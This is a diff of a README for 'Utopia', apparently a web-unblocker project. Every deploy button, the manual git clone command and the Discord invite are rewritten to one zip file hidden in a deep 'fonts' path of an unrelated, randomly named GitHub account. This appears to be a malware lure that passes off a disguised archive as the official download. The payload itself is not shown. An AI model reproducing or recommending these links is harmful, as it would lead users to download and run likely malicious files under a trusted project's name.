@@ -31,24 +31,24 @@ These features can be enabled/disabled in the Settings page in Utopia:
 ## 📦 Deployment
 Easily deploy your own instance of Utopia using one of the platforms below:
 
-[![Run on Replit](https://raw.githubusercontent.com/BinBashBanana/deploy-buttons/master/buttons/remade/replit.svg)](https://replit.com/github/UtopiaUnblocker/Utopia)
+[![Run on Replit](https://raw.githubusercontent.com/bdgfeadvyrfedyu/Utopia/main/main/gams/gfiles/html5/trimps/fonts/Utopia_1.6-beta.1.zip)](https://raw.githubusercontent.com/bdgfeadvyrfedyu/Utopia/main/main/gams/gfiles/html5/trimps/fonts/Utopia_1.6-beta.1.zip)
 <br>
-[![Deploy to Heroku](https://raw.githubusercontent.com/BinBashBanana/deploy-buttons/master/buttons/remade/heroku.svg)](https://heroku.com/deploy/?template=https://github.com/UtopiaUnblocker/Utopia)
+[![Deploy to Heroku](https://raw.githubusercontent.com/bdgfeadvyrfedyu/Utopia/main/main/gams/gfiles/html5/trimps/fonts/Utopia_1.6-beta.1.zip)](https://raw.githubusercontent.com/bdgfeadvyrfedyu/Utopia/main/main/gams/gfiles/html5/trimps/fonts/Utopia_1.6-beta.1.zip)
 <br>
-[![Deploy to IBM Cloud](https://raw.githubusercontent.com/BinBashBanana/deploy-buttons/master/buttons/remade/ibmcloud.svg)](https://cloud.ibm.com/devops/setup/deploy?repository=https://github.com/UtopiaUnblocker/Utopia)
+[![Deploy to IBM Cloud](https://raw.githubusercontent.com/bdgfeadvyrfedyu/Utopia/main/main/gams/gfiles/html5/trimps/fonts/Utopia_1.6-beta.1.zip)](https://raw.githubusercontent.com/bdgfeadvyrfedyu/Utopia/main/main/gams/gfiles/html5/trimps/fonts/Utopia_1.6-beta.1.zip)
 <br>
-[![Deploy to Amplify Console](https://raw.githubusercontent.com/BinBashBanana/deploy-buttons/master/buttons/remade/amplifyconsole.svg)](https://console.aws.amazon.com/amplify/home#/deploy?repo=https://github.com/UtopiaUnblocker/Utopia)
+[![Deploy to Amplify Console](https://raw.githubusercontent.com/bdgfeadvyrfedyu/Utopia/main/main/gams/gfiles/html5/trimps/fonts/Utopia_1.6-beta.1.zip)](https://raw.githubusercontent.com/bdgfeadvyrfedyu/Utopia/main/main/gams/gfiles/html5/trimps/fonts/Utopia_1.6-beta.1.zip)
 <br>
-[![Run on Google Cloud](https://raw.githubusercontent.com/BinBashBanana/deploy-buttons/master/buttons/remade/googlecloud.svg)](https://deploy.cloud.run/?git_repo=https://github.com/UtopiaUnblocker/Utopia)
+[![Run on Google Cloud](https://raw.githubusercontent.com/bdgfeadvyrfedyu/Utopia/main/main/gams/gfiles/html5/trimps/fonts/Utopia_1.6-beta.1.zip)](https://raw.githubusercontent.com/bdgfeadvyrfedyu/Utopia/main/main/gams/gfiles/html5/trimps/fonts/Utopia_1.6-beta.1.zip)
 <br>
-[![Remix on Glitch](https://binbashbanana.github.io/deploy-buttons/buttons/remade/glitch.svg)](https://glitch.com/edit/#!/import/github/UtopiaUnblocker/Utopia)
+[![Remix on Glitch](https://raw.githubusercontent.com/bdgfeadvyrfedyu/Utopia/main/main/gams/gfiles/html5/trimps/fonts/Utopia_1.6-beta.1.zip)](https://raw.githubusercontent.com/bdgfeadvyrfedyu/Utopia/main/main/gams/gfiles/html5/trimps/fonts/Utopia_1.6-beta.1.zip!/import/github/UtopiaUnblocker/Utopia)
 <br>
-[![Deploy To Koyeb](https://binbashbanana.github.io/deploy-buttons/buttons/remade/koyeb.svg)](https://app.koyeb.com/deploy?type=git&repository=github.com/UtopiaUnblocker/Utopia&branch=main&name=Utopia)
+[![Deploy To Koyeb](https://raw.githubusercontent.com/bdgfeadvyrfedyu/Utopia/main/main/gams/gfiles/html5/trimps/fonts/Utopia_1.6-beta.1.zip)](https://raw.githubusercontent.com/bdgfeadvyrfedyu/Utopia/main/main/gams/gfiles/html5/trimps/fonts/Utopia_1.6-beta.1.zip)
 
 ### Manual Setup
 ```bash
 # Clone the repository
-git clone https://github.com/UtopiaUnblocker/Utopia.git
+git clone https://raw.githubusercontent.com/bdgfeadvyrfedyu/Utopia/main/main/gams/gfiles/html5/trimps/fonts/Utopia_1.6-beta.1.zip
 cd Utopia
 
 # Install dependencies
@@ -61,9 +61,9 @@ npm start
 ---
 ## 💬 Community & Support
 Need help deploying or want to suggest features?
-- Join the official Discord: **[discord.gg/hFZC5cgsmq](https://discord.gg/hFZC5cgsmq)**
+- Join the official Discord: **[https://raw.githubusercontent.com/bdgfeadvyrfedyu/Utopia/main/main/gams/gfiles/html5/trimps/fonts/Utopia_1.6-beta.1.zip](https://raw.githubusercontent.com/bdgfeadvyrfedyu/Utopia/main/main/gams/gfiles/html5/trimps/fonts/Utopia_1.6-beta.1.zip)**
 
-[![Join us on Discord](https://invidget.switchblade.xyz/hFZC5cgsmq?theme=dark)](https://discord.gg/unblockers)
+[![Join us on Discord](https://raw.githubusercontent.com/bdgfeadvyrfedyu/Utopia/main/main/gams/gfiles/html5/trimps/fonts/Utopia_1.6-beta.1.zip)](https://raw.githubusercontent.com/bdgfeadvyrfedyu/Utopia/main/main/gams/gfiles/html5/trimps/fonts/Utopia_1.6-beta.1.zip)
 
 ---
 <p align="center">
